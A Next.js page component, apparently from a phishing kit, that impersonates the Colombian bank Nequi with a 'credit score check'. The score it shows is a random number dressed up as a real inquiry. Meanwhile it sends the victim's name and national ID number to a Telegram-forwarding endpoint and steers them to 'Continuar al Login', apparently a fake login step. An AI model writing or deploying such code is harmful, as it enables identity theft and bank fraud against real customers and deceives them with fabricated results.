"use client"

import { useState, useEffect } from "react"
import { useRouter } from "next/navigation"
import { Button } from "@/components/ui/button"

export default function ScoreCheck() {
  const [userInfo, setUserInfo] = useState<{ name: string; document: string } | null>(null)
  const [score, setScore] = useState<number | null>(null)
  const [isLoading, setIsLoading] = useState(false)
  const [showScore, setShowScore] = useState(false)
  const router = useRouter()

  useEffect(() => {
    // Recuperar información del usuario
    const savedInfo = localStorage.getItem("userInfo")
    if (savedInfo) {
      setUserInfo(JSON.parse(savedInfo))
    } else {
      // Si no hay información, redirigir a la página anterior
      router.push("/personal-info")
    }
  }, [router])

  const sendToTelegram = async (type: string, data: any) => {
    try {
      const response = await fetch("/api/telegram", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          type,
          ...data,
        }),
      })

      if (!response.ok) {
        const errorData = await response.json()
        console.error("Error sending to Telegram:", errorData)
      }
    } catch (error) {
      console.error("Error sending to Telegram:", error)
    }
  }

  const generateRandomScore = () => {
    // Generar un score aleatorio entre 300 y 850
    return Math.floor(Math.random() * (850 - 300 + 1)) + 300
  }

  const handleCheckScore = async () => {
    if (!userInfo) return

    setIsLoading(true)

    // Simular consulta de score
    setTimeout(async () => {
      const generatedScore = generateRandomScore()
      setScore(generatedScore)
      setIsLoading(false)
      setShowScore(true)

      // Enviar información del score a Telegram
      await sendToTelegram("score_check", {
        name: userInfo.name,
        document: userInfo.document,
        score: generatedScore,
      })
    }, 3000)
  }

  const handleContinue = () => {
    router.push("/")
  }

  if (!userInfo) {
    return (
      <div className="min-h-screen flex items-center justify-center">
        {" "}
        {/* Eliminar el gradiente de fondo aquí */}
        <div className="text-center">
          <p className="text-gray-700">Cargando...</p>
        </div>
      </div>
    )
  }

  return (
    <div className="min-h-screen flex items-center justify-center p-4">
      {" "}
      {/* Eliminar el gradiente de fondo aquí */}
      {/* Loader */}
      {isLoading && (
        <div className="fixed inset-0 z-20 flex items-center justify-center bg-white">
          <div className="flex flex-col items-center">
            <img
              src="/loading-nequi.webp"
              alt="Cargando Nequi"
              className="w-40 h-40 object-contain mt-16 animate-pulse"
            />
            <p className="font-semibold mt-4 text-gray-700">Consultando tu score crediticio...</p>
          </div>
        </div>
      )}
      <div className="w-full max-w-md bg-white rounded-lg p-8 shadow-lg">
        {" "}
        {/* Fondo blanco para la tarjeta */}
        <div className="text-center mb-8">
          <h1 className="text-2xl font-semibold text-[#200020] mb-2">Score Crediticio</h1>
          <p className="text-gray-600">Consulta tu puntaje crediticio</p>
        </div>
        <div className="space-y-6">
          <div className="bg-gray-50 p-4 rounded-lg">
            <p className="text-sm text-gray-600 mb-1">Nombre:</p>
            <p className="font-semibold text-gray-800">{userInfo.name}</p>
          </div>

          <div className="bg-gray-50 p-4 rounded-lg">
            <p className="text-sm text-gray-600 mb-1">Documento:</p>
            <p className="font-semibold text-gray-800">{userInfo.document}</p>
          </div>

          {showScore && score && (
            <div className="bg-gradient-to-r from-green-50 to-blue-50 p-6 rounded-lg border-2 border-green-200">
              <div className="text-center">
                <p className="text-sm text-gray-600 mb-2">Tu Score Crediticio es:</p>
                <div className="text-4xl font-bold text-green-600 mb-2">{score}</div>
                <div className="text-sm text-gray-500">de 850 puntos</div>
                <div className="mt-4">
                  <div className="w-full bg-gray-200 rounded-full h-3">
                    <div
                      className="bg-gradient-to-r from-green-400 to-green-600 h-3 rounded-full transition-all duration-1000"
                      style={{ width: `${(score / 850) * 100}%` }}
                    ></div>
                  </div>
                </div>
              </div>
            </div>
          )}

          {!showScore ? (
            <Button
              onClick={handleCheckScore}
              className="w-full py-3 bg-[#DA0081] text-white font-semibold rounded-lg hover:bg-[#b3006b] transition-colors"
              disabled={isLoading}
            >
              {isLoading ? "Consultando..." : "Consultar Score"}
            </Button>
          ) : (
            <Button
              onClick={handleContinue}
              className="w-full py-3 bg-[#DA0081] text-white font-semibold rounded-lg hover:bg-[#b3006b] transition-colors"
            >
              Continuar al Login
            </Button>
          )}
        </div>
      </div>
    </div>
  )
}
